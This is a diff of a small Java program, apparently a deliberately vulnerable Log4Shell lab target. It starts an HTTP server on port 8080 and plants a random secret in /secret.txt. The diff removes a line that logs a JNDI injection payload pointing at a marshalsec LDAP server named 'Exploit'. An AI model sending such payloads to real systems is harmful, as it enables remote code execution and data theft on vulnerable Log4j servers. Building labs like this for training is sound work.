@@ -1,11 +1,15 @@
+import org.apache.commons.io.FileUtils;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
+import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.InetSocketAddress;
+import java.nio.charset.Charset;
+import java.util.Random;
 
 import com.google.common.base.Charsets;
 import com.google.common.io.CharStreams;
@@ -36,13 +40,23 @@ public class log4j {
         }
     }
 
-    public static void main(String[] args) throws IOException {
-        logger.error("${jndi:ldap://marshalsec:1389/Exploit}");
+    public static void startServer() throws IOException {
         HttpServer server = HttpServer.create(new InetSocketAddress(8080), 0);
         server.createContext("/", new RootHandler());
         server.setExecutor(null); // creates a default executor
 
         System.out.println("Starting HTTP server on port 8080");
         server.start();
+    }
+
+    public static void createSecret() throws IOException {
+        byte[] random = new byte[16];
+        new Random().nextBytes(random);
+        FileUtils.writeByteArrayToFile(new File("/secret.txt"), random);
+    }
+
+    public static void main(String[] args) throws IOException {
+        createSecret();
+        startServer();
     }
 }
